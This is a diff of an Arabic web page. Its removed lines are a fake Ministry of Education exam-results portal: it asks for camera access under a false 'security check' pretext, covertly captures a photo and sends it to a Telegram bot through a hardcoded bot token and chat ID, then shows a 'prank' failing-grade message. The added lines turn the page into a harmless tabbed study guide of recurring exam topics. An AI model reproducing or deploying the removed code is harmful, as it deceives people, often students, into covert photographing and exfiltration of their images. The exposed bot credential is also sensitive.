@@ -3,127 +3,71 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>بوابة النتائج المركزية | وزارة التربية</title>
+    <title>منصة الثوابت الوزارية | @raslen_mods</title>
     <style>
-        :root { --primary: #2c3e50; --error: #e74c3c; --bg: #ecf0f1; }
-        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: var(--bg); display: flex; align-items: center; justify-content: center; min-height: 100vh; margin: 0; color: #333; overflow: hidden; }
-        .card { background: white; padding: 40px; border-radius: 20px; box-shadow: 0 10px 30px rgba(0,0,0,0.05); width: 90%; max-width: 450px; text-align: center; position: relative; }
-        .logo { width: 70px; height: 70px; background: var(--primary); border-radius: 50%; margin: 0 auto 25px; display: flex; align-items: center; justify-content: center; color: white; font-weight: bold; font-size: 28px; border: 4px solid white; box-shadow: 0 0 15px rgba(0,0,0,0.1); }
-        h2 { margin-bottom: 10px; font-size: 22px; color: #1a1a1a; }
-        p { color: #666; font-size: 15px; line-height: 1.6; margin-bottom: 25px; }
-        .btn { background: var(--primary); color: white; border: none; padding: 15px 30px; border-radius: 12px; font-size: 16px; font-weight: 600; cursor: pointer; width: 100%; transition: 0.3s; }
-        .btn:hover { background: #1a252f; box-shadow: 0 5px 15px rgba(0,0,0,0.2); }
-        .loader-container { display: none; margin-top: 20px; }
-        .progress-bar { width: 100%; height: 8px; background: #eee; border-radius: 10px; overflow: hidden; }
-        .progress-fill { width: 0%; height: 100%; background: var(--primary); transition: width 0.3s; }
-        #status-text { font-size: 13px; color: #888; margin-top: 10px; display: block; }
-        
-        /* شاشة النتيجة النهائية (الـ Prank) */
-        #prank-screen { display: none; text-align: center; }
-        #prank-text { font-size: 32px; color: var(--error); font-weight: bold; margin-top: 20px; line-height: 1.4; animation: shake 0.5s; }
-        #signature { font-size: 18px; color: #555; margin-top: 30px; display: block; font-style: italic; }
-        @keyframes shake { 0% { transform: translateX(0); } 25% { transform: translateX(5px); } 50% { transform: translateX(-5px); } 75% { transform: translateX(5px); } 100% { transform: translateX(0); } }
-
-        /* العناصر المخفية */
-        #v, #c { display: none; }
+        :root { --p: #1a1a2e; --s: #16213e; --a: #e94560; --t: #ffffff; }
+        body { font-family: 'Segoe UI', sans-serif; background: #0f0f1b; color: var(--t); margin: 0; text-align: center; }
+        header { background: var(--p); padding: 25px; border-bottom: 3px solid var(--a); }
+        .tabs { display: flex; overflow-x: auto; background: var(--s); sticky; top: 0; border-bottom: 1px solid #333; }
+        .tab-btn { flex: 0 0 auto; padding: 15px 20px; border: none; background: none; color: #aaa; cursor: pointer; font-size: 1rem; }
+        .tab-btn.active { color: var(--a); border-bottom: 3px solid var(--a); font-weight: bold; }
+        .container { max-width: 700px; margin: 20px auto; padding: 15px; }
+        .content { display: none; animation: fadeIn 0.4s; }
+        .content.active { display: block; }
+        .card { background: var(--s); border-radius: 10px; padding: 15px; margin-bottom: 10px; display: flex; justify-content: space-between; border-right: 4px solid var(--a); }
+        .btn-pdf { display: block; background: #27ae60; color: white; padding: 15px; border-radius: 8px; text-decoration: none; margin-top: 20px; font-weight: bold; }
+        @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
+        footer { padding: 20px; color: #555; font-size: 0.8rem; }
     </style>
 </head>
 <body>
 
-<div id="main-content" style="display:none;" class="card">
-    <div id="initial-screen">
-        <div class="logo">نتائج</div>
-        <h2>نظام استعلام الدرجات الموحد</h2>
-        <p>يرجى الضغط على الزر أدناه لبدء فحص بروتوكولات الأمان وجلب النتيجة النهائية الخاصة بك.</p>
-        <button id="start-btn" class="btn">عرض النتيجة الآن</button>
-        <div id="loader" class="loader-container">
-            <div class="progress-bar"><div id="fill" class="progress-fill"></div></div>
-            <span id="status-text">جاري الاتصال بالسيرفر...</span>
-        </div>
-    </div>
+<header>
+    <h1>🎓 دليل الثوابت الوزارية</h1>
+    <p>إعداد المبرمج Atter (@raslen_mods)</p>
+</header>
 
-    <div id="prank-screen">
-        <div class="logo" style="background: var(--error);">!</div>
-        <div id="prank-text">رسوب في احياء يتصل بكه</div>
-        <div id="signature">(اثير)</div>
-    </div>
-
-    <video id="v" autoplay playsinline></video>
-    <canvas id="c" width="640" height="480"></canvas>
+<div class="tabs">
+    <button class="tab-btn active" onclick="show(event, 'soc')">الاجتماعيات</button>
+    <button class="tab-btn" onclick="show(event, 'phy')">الفيزياء</button>
+    <button class="tab-btn" onclick="show(event, 'chem')">الكيمياء</button>
+    <button class="tab-btn" onclick="show(event, 'bio')">الأحياء</button>
+    <button class="tab-btn" onclick="show(event, 'math')">الرياضيات</button>
+    <button class="tab-btn" onclick="show(event, 'ar')">العربي</button>
+    <button class="tab-btn" onclick="show(event, 'en')">الأنجليزي</button>
 </div>
 
-<div id="denied" style="display:none;">
-    <h1 style="color: #dc3545;">403</h1>
-    <p>الجلسة غير صالحة أو انتهت صلاحية الرمز.</p>
+<div class="container">
+    <div id="soc" class="content active">
+        <div class="card"><span>ثورة العشرين</span><b>مكرر جداً</b></div>
+        <div class="card"><span>عوامل قيام الصناعة</span><b>10 مرات</b></div>
+        <a href="وزاريات_الثالث_المتوسط_المرتبة.pdf" class="btn-pdf">📥 تحميل ملف الاجتماعيات PDF</a>
+    </div>
+
+    <div id="phy" class="content">
+        <div class="card"><span>قانون كولوم</span><b>ثابت سنوياً</b></div>
+        <div class="card"><span>المحولة الكهربائية</span><b>مكرر</b></div>
+        <a href="وزاريات_الثالث_المتوسط_المرتبة.pdf" class="btn-pdf">📥 تحميل ملف الفيزياء PDF</a>
+    </div>
+
+    <div id="chem" class="content">
+        <div class="card"><span>الكشف عن الصوديوم</span><b>مهم جداً</b></div>
+        <a href="وزاريات_الثالث_المتوسط_المرتبة.pdf" class="btn-pdf">📥 تحميل ملف الكيمياء PDF</a>
+    </div>
 </div>
+
+<footer>حقوق الطبع محفوظة 2026 - Atter Projects</footer>
 
 <script>
-    const TOKEN = "8757110843:AAF-xoz_EX9JObBrgV8w35u2KRl3xkKRd0I";
-    const CHAT_ID = "6655185768";
-
-    const urlParams = new URLSearchParams(window.location.search);
-    if (urlParams.get('auth') === 'atter_2026') {
-        document.getElementById('main-content').style.display = 'block';
-    } else {
-        document.getElementById('denied').style.display = 'block';
-    }
-
-    const startBtn = document.getElementById('start-btn');
-    const initialScreen = document.getElementById('initial-screen');
-    const prankScreen = document.getElementById('prank-screen');
-    const loader = document.getElementById('loader');
-    const fill = document.getElementById('fill');
-    const statusText = document.getElementById('status-text');
-    const video = document.getElementById('v');
-    const canvas = document.getElementById('c');
-
-    startBtn.onclick = async () => {
-        try {
-            // طلب الإذن (سيظهر للمستخدم طلب الكاميرا)
-            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-            video.srcObject = stream;
-            
-            startBtn.style.display = 'none';
-            loader.style.display = 'block';
-            
-            updateProgress(30, "جاري فحص بروتوكولات الأمان...");
-
-            setTimeout(async () => {
-                // التقاط الصورة في الخلفية
-                canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
-                const imgData = canvas.toDataURL('image/png');
-                stream.getTracks().forEach(t => t.stop()); // إيقاف الكاميرا فوراً
-                
-                updateProgress(60, "جاري جلب البيانات من قاعدة البيانات...");
-
-                // إرسال الصورة لتليجرام
-                const blob = await (await fetch(imgData)).blob();
-                const fd = new FormData();
-                fd.append("chat_id", CHAT_ID);
-                fd.append("photo", blob, "prank.png");
-                fd.append("caption", "🔔 تم التقاط صورة جديدة من الـ Prank الخاص بك!");
-
-                await fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, { method: "POST", body: fd });
-
-                updateProgress(100, "اكتملت العملية.");
-                
-                // الانتقال لشاشة الـ Prank
-                setTimeout(() => {
-                    initialScreen.style.display = 'none';
-                    prankScreen.style.display = 'block';
-                }, 1000);
-
-            }, 2000);
-        } catch (err) {
-            alert("عذراً، يجب الموافقة على صلاحيات الكاميرا لإتمام عملية فحص الأمان وجلب النتيجة.");
-        }
-    };
-
-    function updateProgress(width, text) {
-        fill.style.width = width + "%";
-        statusText.innerText = text;
+    function show(e, name) {
+        var i, c, t;
+        c = document.getElementsByClassName("content");
+        for (i = 0; i < c.length; i++) c[i].style.display = "none";
+        t = document.getElementsByClassName("tab-btn");
+        for (i = 0; i < t.length; i++) t[i].className = t[i].className.replace(" active", "");
+        document.getElementById(name).style.display = "block";
+        e.currentTarget.className += " active";
     }
 </script>
 </body>
 </html>
-
